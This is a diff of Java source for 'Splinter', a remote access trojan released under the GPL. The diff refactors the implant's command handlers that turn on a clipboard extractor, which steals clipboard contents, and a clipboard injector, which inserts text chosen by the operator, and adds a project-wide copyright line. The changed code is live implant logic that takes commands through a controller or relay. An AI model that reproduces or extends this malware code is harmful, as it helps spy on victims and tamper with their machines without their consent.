@@ -6,6 +6,8 @@
 	Splinter - The RAT (Remote Administrator Tool)
 	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
 	Copyright 2013 Solomon Sonya
+	
+	This copyright applies to the entire Splinter Project and all relating source code
 
 	This program is free software: you are free to  redistribute 
     it under the terms of the GNU General Public License as published by
@@ -1098,22 +1100,28 @@ public class Splinter_IMPLANT extends Thread
         Driver.sop("FYI: I am connected to a Relay System!!!");
       }
 
-      if (cmd[1].trim().equalsIgnoreCase("ENABLE CLIPBOARD EXTRACTOR"))
-      {
-        directoryPath = new Worker_Thread_Payloads(200, this, 0, "", null, 0, null);
-      }
-
-      if (cmd[1].trim().equalsIgnoreCase("ENABLE CLIPBOARD INJECTOR"))
-      {
-        String injectionText = "";
-
-        if ((cmd.length < 2) || (cmd[2] == null))
-          injectionText = "";
-        else {
-          injectionText = cmd[2];
-        }
-        exfiltrationFileType = new Worker_Thread_Payloads(200, this, 1, injectionText, null, 0, null);
-      }
+      /*******************************************************
+		 * CLIPBOARD EXTRACTOR
+		 *******************************************************/
+		if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_EXTRACTOR))
+		{
+			Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_CLIPBOARD_EXTRACTION,"", null, 0, null);
+		}
+		
+		/*******************************************************
+		 * CLIPBOARD INJECTOR
+		 *******************************************************/
+		if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_INJECTOR))
+		{
+			String injectionText = "";
+			
+			if(cmd.length < 2 || cmd[2] == null)
+				injectionText = "";
+			else
+				injectionText = cmd[2];
+			
+			Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_CLIPBOARD_INJECTION, injectionText, null, 0, null);
+		}
 
       if (cmd[1].trim().equalsIgnoreCase("DISABLE CLIPBOARD EXTRACTOR"))
       {
